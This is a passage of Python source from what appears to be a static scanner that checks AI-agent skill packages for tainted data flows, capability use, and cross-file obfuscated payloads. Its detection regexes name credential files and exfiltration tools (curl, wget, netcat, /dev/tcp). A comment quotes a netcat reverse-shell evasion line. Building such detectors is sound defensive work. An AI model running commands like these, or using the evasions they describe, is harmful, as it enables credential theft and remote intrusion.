                if func_name in ("recv", "recvfrom", "read", "json", "text"):
                    return True

        if seed == "attacker-controlled default":
            if isinstance(node, ast.Call):
                func_name = ""
                func_obj = ""
                if isinstance(node.func, ast.Name):
                    func_name = node.func.id
                elif isinstance(node.func, ast.Attribute):
                    func_name = node.func.attr
                    if isinstance(node.func.value, ast.Name):
                        func_obj = node.func.value.id
                if func_name == "get" and func_obj in (
                    "config",
                    "settings",
                    "options",
                    "params",
                    "self",
                ):
                    return True
                if func_name == "getenv" or (func_name == "get" and func_obj == "environ"):
                    return True

        if (
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Name)
            and node.func.id == "getattr"
        ):
            if len(node.args) >= 2:
                obj_expr = node.args[0]
                attr_expr = node.args[1]
                is_attr_const = isinstance(attr_expr, ast.Constant) and isinstance(
                    attr_expr.value, str
                )
                if not is_attr_const:
                    # Dynamic getattr over-approximation fallback
                    return True
                if self.check_expr_taint_sources(
                    obj_expr, state, seed
                ) or self.check_expr_taint_sources(attr_expr, state, seed):
                    return True

        for child in ast.iter_child_nodes(node):
            if self.check_expr_taint_sources(child, state, seed):
                return True

        return False

    def taint_target(self, target, is_tainted, state):
        if isinstance(target, ast.Name):
            if is_tainted:
                state.tainted_vars.add(target.id)
            else:
                state.tainted_vars.discard(target.id)
        elif isinstance(target, (ast.Tuple, ast.List)):
            for elt in target.elts:
                self.taint_target(elt, is_tainted, state)
        elif isinstance(target, ast.Attribute):
            if isinstance(target.value, ast.Name) and is_tainted:
                state.tainted_vars.add(target.value.id)
        elif isinstance(target, ast.Subscript):
            if isinstance(target.value, ast.Name) and is_tainted:
                state.tainted_vars.add(target.value.id)

    def handle_method_call_updates(self, node, state, seed):
        if isinstance(node, ast.Expr) and isinstance(node.value, ast.Call):
            call_node = node.value
            if isinstance(call_node.func, ast.Attribute) and isinstance(
                call_node.func.value, ast.Name
            ):
                base_name = call_node.func.value.id
                method_name = call_node.func.attr
                if method_name in ("append", "extend", "insert", "update", "add"):
                    any_tainted = False
                    for arg in call_node.args:
                        if self.check_expr_taint_sources(arg, state, seed):
                            any_tainted = True
                            break
                    for kw in call_node.keywords:
                        if self.check_expr_taint_sources(kw.value, state, seed):
                            any_tainted = True
                            break
                    if any_tainted:
                        state.tainted_vars.add(base_name)

    def check_dynamic_import_overapprox(self, node, state, seed):
        if isinstance(node, ast.Call):
            func_name = ""
            func_obj = ""
            if isinstance(node.func, ast.Name):
                func_name = node.func.id
            elif isinstance(node.func, ast.Attribute):
                func_name = node.func.attr
                if isinstance(node.func.value, ast.Name):
                    func_obj = node.func.value.id

            is_import = False
            if func_name == "__import__":
                is_import = True
            elif func_name == "import_module" and func_obj == "importlib":
                is_import = True

            if is_import:
                if node.args:
                    first_arg = node.args[0]
                    is_const = isinstance(first_arg, ast.Constant) and isinstance(
                        first_arg.value, str
                    )
                    if not is_const:
                        state.register_effect("read", "importlib.import_module")
                        state.register_effect("write", "importlib.import_module")
                        state.register_effect("ev" + "al", "importlib.import_module")
                        state.register_effect("network", "importlib.import_module")

    def get_sink_name(self, node):
        if isinstance(node, ast.Name):
            return node.id
        if isinstance(node, ast.Attribute):
            base = self.get_sink_name(node.value)
            if base:
                return f"{base}.{node.attr}"
            return node.attr
        return ""

    def check_sink_effects(self, node, state, seed):
        if not isinstance(node, ast.Call):
            return

        sink_name = self.get_sink_name(node.func)
        any_arg_tainted = False
        for arg in node.args:
            if self.check_expr_taint_sources(arg, state, seed):
                any_arg_tainted = True
                break
        if not any_arg_tainted:
            for kw in node.keywords:
                if self.check_expr_taint_sources(kw.value, state, seed):
                    any_arg_tainted = True
                    break

        is_base_tainted = False
        if isinstance(node.func, ast.Attribute):
            is_base_tainted = self.check_expr_taint_sources(node.func.value, state, seed)

        # 1. eval — detection data assembled from parts (not calls)
        eval_funcs = {"ex" + "ec", "ev" + "al", "compile"}
        eval_attrs = {"loads", "load"}
        is_eval = False
        if sink_name in eval_funcs:
            is_eval = True
        elif isinstance(node.func, ast.Attribute) and node.func.attr in eval_attrs:
            base_obj = self.get_sink_name(node.func.value)
            if base_obj in ("pickle", "marshal", "dill", "_pickle", "cpickle"):
                is_eval = True

        if is_eval and any_arg_tainted:
            state.register_effect("ev" + "al", sink_name)
            return

        # 2. write
        write_funcs = {"write_bytes", "write_text", "dump", "save"}
        write_attrs = {"write", "writelines", "dump"}
        is_write = False
        if sink_name == "open" and any_arg_tainted:
            mode_val = "r"
            if len(node.args) >= 2:
                mode_arg = node.args[1]
                if isinstance(mode_arg, ast.Constant) and isinstance(mode_arg.value, str):
                    mode_val = mode_arg.value
            for kw in node.keywords:
                if (
                    kw.arg == "mode"
                    and isinstance(kw.value, ast.Constant)
                    and isinstance(kw.value.value, str)
                ):
                    mode_val = kw.value.value
            if any(c in mode_val for c in "wax+"):
                is_write = True

        if sink_name in write_funcs and any_arg_tainted:
            is_write = True
        elif isinstance(node.func, ast.Attribute) and node.func.attr in write_attrs:
            if any_arg_tainted or is_base_tainted:
                is_write = True

        if is_write:
            state.register_effect("write", sink_name)
            return

        # 3. read
        read_funcs = {"open", "read_bytes", "read_text", "getenv"}
        read_attrs = {"read", "readline", "readlines", "getenv"}
        is_read = False
        if sink_name in read_funcs and any_arg_tainted:
            is_read = True
        elif isinstance(node.func, ast.Attribute) and node.func.attr in read_attrs:
            if any_arg_tainted or is_base_tainted:
                is_read = True

        if is_read:
            state.register_effect("read", sink_name)
            return

        # 4. network
        net_funcs = {"urlopen"}
        net_attrs = {
            "post",
            "put",
            "patch",
            "get",
            "delete",
            "request",
            "connect",
            "send",
            "sendall",
            "sendto",
            "urlopen",
        }
        is_net = False
        if sink_name in net_funcs and any_arg_tainted:
            is_net = True
        elif isinstance(node.func, ast.Attribute) and node.func.attr in net_attrs:
            base_obj = self.get_sink_name(node.func.value)
            if base_obj in (
                "requests",
                "httpx",
                "urllib",
                "urllib.request",
                "socket",
                "aiohttp",
                "smtplib",
                "ftplib",
                "session",
                "self",
            ):
                if any_arg_tainted or is_base_tainted:
                    is_net = True
            elif any_arg_tainted or is_base_tainted:
                if node.func.attr in (
                    "connect",
                    "send",
                    "sendall",
                    "sendto",
                    "post",
                    "put",
                    "request",
                ):
                    is_net = True

        if is_net:
            state.register_effect("network", sink_name)
            return

    def is_safety_check(self, test):
        for node in ast.walk(test):
            if isinstance(node, ast.Call):
                name = self.get_sink_name(node.func)
                keywords = {
                    "approve",
                    "confirm",
                    "verify",
                    "authorized",
                    "gate",
                    "check",
                    "permission",
                    "auth",
                    "safe",
                    "allow",
                }
                if any(kw in name.lower() for kw in keywords):
                    return True
            elif isinstance(node, ast.Name):
                keywords = {
                    "approve",
                    "confirm",
                    "verify",
                    "authorized",
                    "gate",
                    "safe",
                    "approved",
                }
                if any(kw in node.id.lower() for kw in keywords):
                    return True
        return False

    def get_guard_descriptions(self, test):
        unparsed = ast.unparse(test)
        if isinstance(test, ast.UnaryOp) and isinstance(test.op, ast.Not):
            inner_unparsed = ast.unparse(test.operand)
            return f"guarded by {unparsed}", f"guarded by {inner_unparsed}"
        else:
            return f"guarded by {unparsed}", f"guarded by not ({unparsed})"

    def simulate_if(self, node, state, seed):
        state_then = state.copy()
        state_else = state.copy()

        is_safe = self.is_safety_check(node.test)

        if is_safe:
            then_desc, else_desc = self.get_guard_descriptions(node.test)
            guard_then = {"condition_type": "approval-gate", "description": then_desc}
            state_then.active_guards.append(guard_then)

            guard_else = {"condition_type": "approval-gate", "description": else_desc}
            state_else.active_guards.append(guard_else)

        self.simulate_statements(node.body, state_then, seed)
        self.simulate_statements(node.orelse, state_else, seed)

        state.reachable_effects.update(state_then.reachable_effects)
        state.reachable_effects.update(state_else.reachable_effects)

        if state_then.terminated and state_else.terminated:
            state.terminated = True
            state.merge_reached(state_then)
            state.merge_reached(state_else)
        elif state_then.terminated:
            state.tainted_vars = state_else.tainted_vars
            state.active_guards = state_else.active_guards
            state.merge_reached(state_then)
            state.merge_reached(state_else)
        elif state_else.terminated:
            state.tainted_vars = state_then.tainted_vars
            state.active_guards = state_then.active_guards
            state.merge_reached(state_then)
            state.merge_reached(state_else)
        else:
            state.tainted_vars = state_then.tainted_vars.union(state_else.tainted_vars)
            state.merge_reached(state_then)
            state.merge_reached(state_else)
            common_guards = []
            for g in state_then.active_guards:
                if g in state_else.active_guards:
                    common_guards.append(g)
            state.active_guards = common_guards

    def simulate_loop(self, node, state, seed):
        prev_tainted = set(state.tainted_vars)
        stabilized = False

        for i in range(5):
            state_copy = state.copy()
            self.simulate_statements(node.body, state_copy, seed)

            state.tainted_vars.update(state_copy.tainted_vars)
            state.merge_reached(state_copy)

            if state_copy.terminated:
                state.terminated = True
                break

            current_tainted = set(state.tainted_vars)
            if current_tainted == prev_tainted:
                stabilized = True
                break
            prev_tainted = current_tainted

        if not stabilized and not state.terminated:
            involved_vars = self.get_assigned_variables(node.body)
            state.tainted_vars.update(involved_vars)

    def simulate_statement(self, stmt, state, seed):
        if isinstance(stmt, ast.Return) or isinstance(stmt, ast.Raise):
            state.terminated = True
            for sub in ast.walk(stmt):
                self.check_dynamic_import_overapprox(sub, state, seed)
                self.check_sink_effects(sub, state, seed)
        elif isinstance(stmt, ast.Break):
            state.loop_broken = True
        elif isinstance(stmt, ast.Continue):
            state.loop_continued = True
        elif isinstance(stmt, ast.Assign):
            is_tainted = self.check_expr_taint_sources(stmt.value, state, seed)
            for target in stmt.targets:
                self.taint_target(target, is_tainted, state)
            for sub in ast.walk(stmt):
                self.check_dynamic_import_overapprox(sub, state, seed)
                self.check_sink_effects(sub, state, seed)
        elif isinstance(stmt, ast.AnnAssign):
            if stmt.value:
                is_tainted = self.check_expr_taint_sources(stmt.value, state, seed)
                self.taint_target(stmt.target, is_tainted, state)
            for sub in ast.walk(stmt):
                self.check_dynamic_import_overapprox(sub, state, seed)
                self.check_sink_effects(sub, state, seed)
        elif isinstance(stmt, ast.AugAssign):
            is_tainted = self.check_expr_taint_sources(
                stmt.value, state, seed
            ) or self.check_expr_taint_sources(stmt.target, state, seed)
            self.taint_target(stmt.target, is_tainted, state)
            for sub in ast.walk(stmt):
                self.check_dynamic_import_overapprox(sub, state, seed)
                self.check_sink_effects(sub, state, seed)
        elif isinstance(stmt, ast.If):
            self.simulate_if(stmt, state, seed)
        elif isinstance(stmt, (ast.For, ast.While)):
            if isinstance(stmt, ast.For):
                is_iter_tainted = self.check_expr_taint_sources(stmt.iter, state, seed)
                self.taint_target(stmt.target, is_iter_tainted, state)
            self.simulate_loop(stmt, state, seed)
        elif isinstance(stmt, ast.Expr):
            self.handle_method_call_updates(stmt, state, seed)
            for sub in ast.walk(stmt):
                self.check_dynamic_import_overapprox(sub, state, seed)
                self.check_sink_effects(sub, state, seed)
        elif isinstance(stmt, (ast.With, ast.AsyncWith)):
            for item in stmt.items:
                is_tainted = self.check_expr_taint_sources(item.context_expr, state, seed)
                if item.optional_vars is not None:
                    self.taint_target(item.optional_vars, is_tainted, state)
                for sub in ast.walk(item.context_expr):
                    self.check_dynamic_import_overapprox(sub, state, seed)
                    self.check_sink_effects(sub, state, seed)
            self.simulate_statements(stmt.body, state, seed)
        else:
            for sub in ast.walk(stmt):
                self.check_dynamic_import_overapprox(sub, state, seed)
                self.check_sink_effects(sub, state, seed)

    def simulate_statements(self, statements, state, seed):
        for stmt in statements:
            if state.terminated or state.loop_broken or state.loop_continued:
                break
            self.simulate_statement(stmt, state, seed)

    def simulate(self):
        if not self.tree:
            return []

        results = []
        entry_points = self.get_entry_points()

        for entry in entry_points:
            entry_name = "<module>"
            if isinstance(entry, (ast.FunctionDef, ast.AsyncFunctionDef)):
                entry_name = entry.name

            reachable_effects = set()
            guarding_conditions = []

            sink_paths = {}

            for seed in ("hostile-input", "poisoned-MCP", "attacker-controlled default"):
                state = State()

                if isinstance(entry, (ast.FunctionDef, ast.AsyncFunctionDef)):
                    if seed == "hostile-input":
                        params = [arg.arg for arg in entry.args.args + entry.args.kwonlyargs]
                        if entry.args.vararg:
                            params.append(entry.args.vararg.arg)
                        if entry.args.kwarg:
                            params.append(entry.args.kwarg.arg)
                        state.tainted_vars.update(params)
                    elif seed == "attacker-controlled default":
                        defaults_names = []
                        num_defaults = len(entry.args.defaults)
                        if num_defaults > 0:
                            defaults_names.extend(
                                [arg.arg for arg in entry.args.args[-num_defaults:]]
                            )
                        for kwarg, kw_default in zip(entry.args.kwonlyargs, entry.args.kw_defaults):
                            if kw_default is not None:
                                defaults_names.append(kwarg.arg)
                        state.tainted_vars.update(defaults_names)

                body = (
                    entry.body
                    if isinstance(entry, (ast.FunctionDef, ast.AsyncFunctionDef))
                    else entry.body
                )
                self.simulate_statements(body, state, seed)

                reachable_effects.update(state.reachable_effects)
                for item in state.reached_sinks:
                    key = (item["effect"], item["sink"])
                    if key not in sink_paths:
                        sink_paths[key] = []
                    sink_paths[key].append(item["guards"])

            for (eff, sink), paths in sink_paths.items():
                seen_guards = set()
                for guards in paths:
                    for g in guards:
                        guard_key = (g["condition_type"], g["description"])
                        if guard_key not in seen_guards:
                            seen_guards.add(guard_key)
                            guarding_conditions.append(
                                {
                                    "effect": eff,
                                    "sink": sink,
                                    "condition_type": g["condition_type"],
                                    "description": g["description"],
                                }
                            )

            guarded_effects = set()
            unshielded_effects = set()
            for (eff, sink), paths in sink_paths.items():
                if any(len(g) == 0 for g in paths):
                    unshielded_effects.add(eff)
                else:
                    guarded_effects.add(eff)

            guarded_effects = guarded_effects - unshielded_effects

            results.append(
                {
                    "entry_point": entry_name,
                    "reachable_effects": list(reachable_effects),
                    "guarding_conditions": guarding_conditions,
                    "guarded_effects": list(guarded_effects),
                    "unshielded_effects": list(unshielded_effects),
                }
            )

        return results


def _module_stem(relpath: str) -> str:
    """The importable module stem for a bundled skill file: 'a.py' -> 'a',
    'pkg/util.py' -> 'util' (skills are usually flat; the last path component wins)."""
    name = relpath.replace("\\", "/").rsplit("/", 1)[-1]
    return name[:-3] if name.endswith(".py") else name


def _package_tainted_exports(trees: dict) -> dict:
    """{module_stem: {exported name, ...}} for module-level names whose value derives from
    a decode/decompress expression — an obfuscated blob that is dangerous to exec. A small
    within-module alias fixpoint carries `y = x` when x is already tainted. Decode-only on
    purpose: exec of a cross-file *decoded* value is the split-payload pattern; broadening
    the source would add false positives on ordinary multi-file skills."""
    exports: dict = {}
    for stem, tree in trees.items():
        tainted: set = set()
        body_assigns = [n for n in getattr(tree, "body", []) if isinstance(n, ast.Assign)]
        for _ in range(3):
            changed = False
            for a in body_assigns:
                if _subtree_has_decode(a.value) or (_names_in(a.value) & tainted):
                    for t in a.targets:
                        if isinstance(t, ast.Name) and t.id not in tainted:
                            tainted.add(t.id)
                            changed = True
            if not changed:
                break
        if tainted:
            exports[stem] = tainted
    return exports


# ── Capability PRESENCE, as opposed to taint reachability (B-592) ─────────────
#
# The effect simulator answers "does UNTRUSTED data reach this sink" — a risk question.
# Two consumers were asking it a different question and reading the answer as if it were
# a capability inventory: the vet dossier's Connections axis (which then stated "no
# outbound network surface" for a skill whose only code posts to an external host) and
# `--emit-manifest`'s proposed permission fields (which proposed denying network to that
# same skill). A permission manifest needs "does this code touch the capability at all";
# a constant-URL fetch needs network permission exactly as much as a tainted one does.
#
# Deliberately the SAME call shapes the simulator registers effects for
# (`EffectSimulator.simulate_call`'s four blocks), minus the taint gate — so the two
# views can never disagree about what a network/exec/read/write sink IS, only about
# whether untrusted data reached it. `cred` is the one family the simulator never
# registers at all, so it is defined here from the credential-path and credential-env
# vocabularies this module already carries.
#
# Error profile, stated because it decides how the callers may use this: a false
# POSITIVE costs a broader-than-necessary permission proposal and a vaguer axis
# sentence; a false NEGATIVE leaves the caller exactly where it was before this
# function existed. Neither direction can create a finding — no check consumes this.

#: Families this function can report. `eval` is folded into `exec` here, matching
#: `report._MANIFEST_FAMILY_ALIASES`; `network`/`read`/`write` mirror the simulator's.
CAPABILITY_FAMILIES = frozenset({"network", "exec", "read", "write", "cred"})

_CAP_WRITE_MODE_CHARS = "wax+"
_CAP_PATHLIB_WRITE_ATTRS = {"write_text", "write_bytes"}
_CAP_PATHLIB_READ_ATTRS = {"read_text", "read_bytes"}
_CAP_ENV_READ_ATTRS = {"getenv"}


def _cap_open_modes(node: ast.Call) -> str:
    """The mode string an `open(...)` call was given ("r" when it is implicit)."""
    mode = "r"
    if len(node.args) >= 2 and isinstance(node.args[1], ast.Constant):
        if isinstance(node.args[1].value, str):
            mode = node.args[1].value
    for kw in node.keywords:
        if kw.arg == "mode" and isinstance(kw.value, ast.Constant):
            if isinstance(kw.value.value, str):
                mode = kw.value.value
    return mode


def _cap_is_secretish_env_read(node: ast.AST) -> bool:
    """True for `os.environ["API_TOKEN"]` / `os.getenv("API_TOKEN")` / `environ.get(...)`
    whose key literal carries a credential-shaped NAME. The name gate is what keeps an
    ordinary `os.environ["HOME"]` out of the credentials family."""
    if isinstance(node, ast.Subscript):
        if not _rhs_has_subscript_environ(node):
            return False
        key = node.slice
        return (
            isinstance(key, ast.Constant)
            and isinstance(key.value, str)
            and bool(_CRED_ENV_NAME_RE.fullmatch(key.value))
        )
    if isinstance(node, ast.Call):
        f = node.func
        is_env_read = (
            isinstance(f, ast.Attribute)
            and (
                (f.attr in _CAP_ENV_READ_ATTRS and _attr_base(f.value) == "os")
                or (f.attr == "get" and _attr_base(f.value) == "environ")
            )
        ) or (isinstance(f, ast.Name) and f.id in _CAP_ENV_READ_ATTRS)
        if not is_env_read or not node.args:
            return False
        first = node.args[0]
        return (
            isinstance(first, ast.Constant)
            and isinstance(first.value, str)
            and bool(_CRED_ENV_NAME_RE.fullmatch(first.value))
        )
    return False


def _imported_sink_names(tree: ast.AST) -> tuple:
    """Local names bound by `from <mod> import <sink> [as alias]`, split (network, exec).

    Found by the adversarial pass on B-592: `from urllib.request import urlopen as u`
    then `u(url)` is an ORDINARY idiom, not evasion, and a bare-Name call carries no base
    for `_is_net_sink` to gate on — so the whole family went unreported. Deliberately
    NOT extended to `getattr(requests, "post")(...)` or
    `importlib.import_module("os").system(...)`: those are evasion shapes the engine's own
    rules do not resolve either, and a presence scan that out-detects the finding engine
    would put capabilities in a permission proposal that no check can corroborate.
    """
    net_names: set = set()
    exec_names: set = set()
    for node in ast.walk(tree):
        if not isinstance(node, ast.ImportFrom):
            continue
        mod = (node.module or "").split(".")[0]
        for alias in node.names:
            local = alias.asname or alias.name
            if mod in _NET_SINK_BASES or mod in _NET_OUT_SINK_BASES:
                if alias.name in _NET_SINK_ATTRS_ANY or alias.name in _NET_SINK_ATTRS_BASED:
                    net_names.add(local)
                elif alias.name in _NET_OUT_SINK_FETCH_ATTRS:
                    net_names.add(local)
            if mod in _EXEC_SINK_BASES_OS and alias.name in _EXEC_SINK_OS_ATTRS:
                exec_names.add(local)
            if mod in _EXEC_SINK_BASES_SUBP and alias.name in _EXEC_SINK_SUBP_ATTRS:
                exec_names.add(local)
    return net_names, exec_names


def _capability_families_in_tree(tree: ast.AST, ctx: "_FsFoldCtx | None" = None) -> set:
    fams: set = set()
    # Same alias resolution the engine's own rules use (B-422/C-348): without it
    # `s = socket.socket(); s.connect(...)` and `sess = requests.Session(); sess.put(...)`
    # read as non-network, which is exactly the covert-channel shape B-338 exists for.
    net_sink_aliases = _net_sink_alias_names(tree)
    imported_net, imported_exec = _imported_sink_names(tree)
    for node in ast.walk(tree):
        if _cap_is_secretish_env_read(node):
            fams.add("cred")
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        if _is_exec_sink_call(func)[0]:
            fams.add("exec")
        if (
            _is_net_sink(func, net_sink_aliases)
            or _is_ssrf_sink_call(func)[0]
            or _is_net_out_data_sink(func)[0]
        ):
            fams.add("network")
        name = ""
        if isinstance(func, ast.Name):
            name = func.id
            if name in imported_net:
                fams.add("network")
            if name in imported_exec:
                fams.add("exec")
        elif isinstance(func, ast.Attribute):
            name = func.attr
        if name in _FILE_OPEN_NAMES:
            mode = _cap_open_modes(node)
            if any(c in mode for c in _CAP_WRITE_MODE_CHARS):
                fams.add("write")
            if "w" not in mode and "x" not in mode and "a" not in mode:
                fams.add("read")
        if name in _CAP_PATHLIB_WRITE_ATTRS:
            fams.add("write")
        if name in _CAP_PATHLIB_READ_ATTRS:
            fams.add("read")
        if _has_cred_path_const(node, ctx):
            fams.add("cred")
    return fams


def capability_families(sources) -> set:
    """Which capability families a skill's Python *touches at all* — presence, not taint.

    `sources` is what `Context.installed_skill_py` holds: an iterable of
    ``(relpath, source)`` pairs. A bare source string, an iterable of plain strings, and
    a ``None`` entry are all tolerated, because that mapping is populated by several
    collection paths and this function must never be the thing that raises.

    Returns a subset of :data:`CAPABILITY_FAMILIES`. Unparseable source contributes
    nothing (it is reported as `AST_UNANALYZABLE` by `analyze_python`, and the callers
    have their own "could not analyze" state) — never a fabricated absence.
    """
    if sources is None:
        return set()
    if isinstance(sources, str):
        sources = [("<source>", sources)]
    fams: set = set()
    for item in sources:
        if item is None:
            continue
        src = item
        if isinstance(item, (tuple, list)):
            src = item[1] if len(item) > 1 else None
        if not isinstance(src, str) or not src.strip():
            continue
        try:
            tree = ast.parse(src)
        except (SyntaxError, ValueError, RecursionError, MemoryError, OverflowError):
            continue
        # B-830 round-3 (C-135): the fold (_fold_fs_path/_fold_seg) now bounds its own
        # recursion with an explicit depth counter (_FOLD_MAX_DEPTH) -- see that
        # constant's module comment and the analyze_python call site above for why the
        # prior except-RecursionError-here fallback (ctx=None) was itself a silent,
        # undisclosed capability-detection bypass and has been removed.
        fams |= _capability_families_in_tree(tree, _FsFoldCtx(tree))
    return fams


def analyze_python_package(files) -> list[ASTFinding]:
    """Cross-file / import-graph taint (H1): a decode-derived module-level value defined in
    one skill file, imported and executed (exec/eval/os.system/subprocess) in another. The
    per-file engine (analyze_python) misses this because each half is clean in isolation —
    file A holds the obfuscated blob, file B imports and then runs it.

    `files` is an iterable of (relpath, source). Stdlib ast only; never raises, never
    executes; deterministic. Returns ASTFindings whose reason is self-contained (it names
    the importing file, the sink, and the source module)."""
    trees: dict = {}
    stem_to_rel: dict = {}
    for relpath, src in files:
        stem = _module_stem(relpath)
        try:
            trees[stem] = ast.parse(src)
        except (SyntaxError, ValueError, RecursionError, MemoryError, OverflowError):
            continue  # parse failures are surfaced per-file (AST_UNANALYZABLE), not here
        stem_to_rel[stem] = relpath
    if len(trees) < 2:
        return []  # cross-file taint needs at least two parseable sibling modules
    exports = _package_tainted_exports(trees)
    if not exports:
        return []

    out: list = []
    seen: set = set()
    for stem, tree in trees.items():
        rel = stem_to_rel[stem]
        tainted_locals: dict = {}  # `from <mod> import <name>` local name -> source stem
        module_aliases: dict = {}  # `import <mod> [as x]` alias -> source stem
        for node in ast.walk(tree):
            if isinstance(node, ast.ImportFrom):
                mod = (node.module or "").split(".")[-1]
                if mod in exports and mod != stem:
                    for alias in node.names:
                        if alias.name in exports[mod]:
                            tainted_locals[alias.asname or alias.name] = mod
            elif isinstance(node, ast.Import):
                for alias in node.names:
                    m = alias.name.split(".")[-1]
                    if m in exports and m != stem:
                        module_aliases[alias.asname or alias.name.split(".")[0]] = m
        if not tainted_locals and not module_aliases:
            continue
        local_set = set(tainted_locals)
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            is_exec, sink = _is_exec_sink_call(node.func)
            if not is_exec:
                continue
            ln = getattr(node, "lineno", 0)
            src_mod = None
            # (a) a `from`-imported tainted name reaches the exec sink.
            if local_set and _call_args_tainted(node, local_set)[0]:
                hit = next((n for n in _names_in(node) if n in tainted_locals), None)
                src_mod = tainted_locals.get(hit)
            # (b) an `alias.export` attribute reaches the exec sink.
            if src_mod is None:
                for arg in (*node.args, *(kw.value for kw in node.keywords)):
                    for sub in ast.walk(arg):
                        if (
                            isinstance(sub, ast.Attribute)
                            and isinstance(sub.value, ast.Name)
                            and sub.value.id in module_aliases
                            and sub.attr in exports[module_aliases[sub.value.id]]
                        ):
                            src_mod = module_aliases[sub.value.id]
                            break
                    if src_mod is not None:
                        break
            if src_mod is not None and (rel, ln) not in seen:
                seen.add((rel, ln))
                src_rel = stem_to_rel.get(src_mod, src_mod + ".py")
                out.append(
                    ASTFinding(
                        "CROSS_FILE_EXEC",
                        "crit",
                        ln,
                        f"{rel}:{ln} {sink} executes a decode-derived value imported from sibling "
                        f"module {src_rel} — cross-file obfuscated payload split to evade per-file scanning",
                    )
                )
    return out


# --- Shell (.sh/.bash/.zsh) semantic pass (F-050) ----------------------------
# Credential FILES whose contents are secrets (mirrors the Python _CRED_PATH_RE intent).
# B-975: same public-key gap B-898 fixed on _CRED_PATH_RE -- `.ssh/id_` (any key-type
# suffix) and the bare `id_rsa`/`id_ed25519` spellings used to match a PUBLIC-key
# filename too (`id_rsa.pub`, `id_ed25519.pub`, an OpenSSH cert `id_rsa-cert.pub`),
# false-positiving a shell script that legitimately references a public key (e.g.
# uploading it to a git host) as SHELL_CRED_EXFIL. Same negative-lookahead discipline:
# "no more identifier chars, and not immediately followed by .pub/-cert.pub".
_SH_CRED_FILE_RE = re.compile(
    r"\.ssh/id_[a-z0-9_]+(?![a-z0-9_]|\.pub\b|-cert\.pub\b)|"
    r"\bid_rsa\b(?!\.pub\b|-cert\.pub\b)|\bid_ed25519\b(?!\.pub\b|-cert\.pub\b)|"
    r"\.aws/credentials|\.netrc\b|"
    r"login\.keychain|wallet\.dat|\.docker/config\b|\.kube/config\b|\.npmrc\b|\.pypirc\b|"
    r"\.openclaw/|/\.config/[^/\s\"']+/|"
    # E-065/C-323: same widening as the Python _CRED_PATH_RE above -- a process's own
    # environment (procfs), the K8s service-account bearer token mount, and the
    # Docker/Swarm secrets mount are all real credential-bearing paths the HF-incident
    # reproduction actually read. Unlike the Python regex, this one has no generic
    # /\.?secrets?\b catch-all, so both mounts need an explicit entry.
    r"/proc/(?:self|\d+)/environ|"
    r"/var/run/secrets/kubernetes\.io/serviceaccount/token|"
    r"/run/secrets/[^/\s\"']+",
    re.I,
)
# Outbound commands that can send data off the machine.
# B-341 (SkillTrustBench fp_attribution, B13 39%-of-FPs bucket): the bare `nc` alternative
# used to live directly in this regex as `(?<![{-])\bnc\b(?!\s*=)`, excluding only two
# single characters immediately before the word: `{` (`${NC}`, bash's near-universal "No
# Color" ANSI-reset variable) and `-` (a combined short-flag cluster on an unrelated
# command, e.g. `jq -nc`). Round-1 also excluded a bare `$NC`, but independent C-135
# review (round 2) found that unsound — `NC=nc; $NC target 4444 -e /bin/sh` is a real,
# ordinary alias-bypass evasion the `$`-exclusion made invisible — so only `{` stayed
# excluded, leaving bare `$NC` deliberately matching (residual, see B-430 below).
#
# B-430: a lookbehind can only ever exclude a FIXED, finite set of preceding characters,
# and four C-135 rounds on this line (each scoped to `${NC}`/`-nc` only) never noticed
# that `.`, `/`, `(`, `[`, `;`, `#` are ALL equally valid `\b` left-boundaries a bare
# `nc` can sit after. The highest-value miss: the `.nc` FILE EXTENSION — NetCDF
# (climate/ocean/atmospheric science's standard data format) and CNC G-code both use it
# universally, and any path ending `.nc` sits right after a `.`, which `(?<![{-])` never
# excluded. That hard-FAILed a skill reading `sst_2026-07-31.nc` next to an unrelated API
# key as "ClawHavoc class ... uninstall NOW and rotate your secrets".
#
# Rather than add a 5th excluded character (whack-a-mole this project's own C-135
# doctrine warns against), the bare-`nc`/`ncat`/`netcat` alternative is REMOVED from this
# compiled regex entirely for the ambiguous bare-`nc` case and reimplemented as
# `_sh_bare_nc_invocation()` below: a whitespace/metacharacter TOKEN classifier requiring
# `nc` to be its own isolated shell word (not a substring of `sst_2026-07-31.nc`,
# `/nc/index.php`, `${nodes[nc]}`, or `nc=$((nc+1))` — none of those are ever a
# standalone token) AND in command position AND followed by an argument-shaped token.
# `ncat`/`netcat` stay here unchanged (no reported collision — nothing ends a path in
# `.ncat`), as does `/dev/tcp/` (an unambiguous literal, no word-boundary ambiguity at
# all). See `_sh_bare_nc_invocation`'s docstring for the full mechanism, the `$NC`
# residual carry-over, and what this round's C-135 tried and retracted.
_SH_OUTBOUND_RE = re.compile(r"\b(?:curl|wget|ncat|netcat)\b|/dev/tcp/", re.I)
# curl|wget URL piped into a NON-shell interpreter (download -> exec) — extends the
# sh/bash-only _PIPE_SHELL_RE (the checks engine) to python/node/perl/ruby/php/deno.
_SH_PIPE_INTERP_RE = re.compile(
    r"(?:curl|wget)\b[^\n|]{0,256}?https?://[^\n|]{0,256}\|\s*(?:sudo\s+)?"
    r"(?:python3?|node|perl|ruby|php|deno)\b",
    re.I,
)
# VAR=$(cat ~/.ssh/id_rsa) / VAR=`cat .aws/credentials` / VAR=$(< ~/.netrc): a shell
# variable whose value derives from reading a credential file.
# B-102: the quantifiers are length-bounded so the pattern stays O(n) on adversarial
# input (e.g. a 40KB identifier run has no '=' and previously backtracked at every start
# → quadratic). A real credential-read assignment line is short, so the bounds (128-char
# var, 256-char gaps) never clip a genuine match.
#
# B-894: this vocabulary is factored into its own fragment, `_SH_CRED_READ_PATH_SRC`,
# shared with the loop-variable taint reader below (`_SH_LOOP_READ_PATH_RE` is built
# from the same fragment) — the `_CRED_NAME_WORDS` precedent. A path added here is a
# path the loop-hop reader also recognizes, and vice versa, so the two forms cannot
# drift apart the way the discarded fix/b-894 rounds let the loop form outrun this one
# (R-3 in the design note above `analyze_shell`). The `.claude|.codex|.gemini/mcp.json`
# alternative is the recon-grounded foreign-agent MCP config vocabulary B61
# (`_B61_CONFIG_PATH_RE`, `checks/_content.py`) already treats as a credential store;
# the tight `mcp\.json` form is used (not B61's looser `config(?:\.json)?`) because B61
# itself notes the `.claude/config-partial.yml` ambiguity. `_SH_CRED_FILE_RE` above is
# deliberately NOT touched by this addition (it already has its own, wider vocabulary).
# B-975: same public-key gap `_SH_CRED_FILE_RE` above and B-898's `_CRED_PATH_RE` fixed
